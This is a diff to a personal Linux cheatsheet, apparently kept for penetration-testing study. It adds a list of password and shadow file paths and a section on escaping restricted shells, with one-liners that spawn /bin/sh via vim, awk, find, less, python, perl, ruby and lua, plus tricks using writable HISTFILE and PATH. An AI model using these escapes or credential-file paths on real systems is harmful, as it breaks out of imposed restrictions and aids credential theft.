@@ -1,5 +1,15 @@
 # Cheatsheet
 
+## Password
+```
+/etc/pwd.db
+/etc/passwd
+
+/etc/spwd.db
+/etc/shadow
+
+/etc/master.passwd
+```
 ## Cheatsheets
 - Bash cheatsheet: https://devhints.io/bash.html
 - Archiving: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/
@@ -80,10 +90,10 @@ Permission in numeric mode
 4 = Read
 ```
 
-Commands 
+Commands
 
 ```
-chmod 
+chmod
 chown
 chgrp
 
@@ -624,3 +634,79 @@ fbdump
 
 References
 - [https://www.kernel.org/doc/Documentation/fb/framebuffer.txt](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt)
+
+## Escape shell
+
+```
+env
+echo $PATH
+echo /usr/local/rbin/*
+```
+
+List read only variables (check If PATH or SHELL is writable):
+
+```
+export -p
+```
+
+VI / VIM
+
+```
+:set shell=/bin/bash
+:shell
+```
+
+```
+:! /bin/bash
+```
+
+AWK
+
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+Find
+
+```
+find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+
+More / Less / Man
+
+```
+'! /bin/sh'
+'!/bin/sh'
+'!bash'
+```
+
+Tee
+
+```
+echo "evil script code" | tee script.sh
+```
+
+Languages
+
+```
+python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+irb(main:001:0> exec "/bin/sh"
+```
+
+
+
+- Copy files into $PATH
+- Copy file into HOME (scp/ftp)
+- Some restricted shells will start by running some files in an unrestricted mode (If your .bash_profile is executed in an unrestricted mode and it's editable)
+- If HISTFILE and HISTSIZE are writable:
+  - Set HISTFILE to the file you want to overwrite (preferably an executable)
+  - Set HISTSIZE to 0 and then back to 100,
+  - Then execute the lines you want in your shell script
+
+References
+
+- [https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
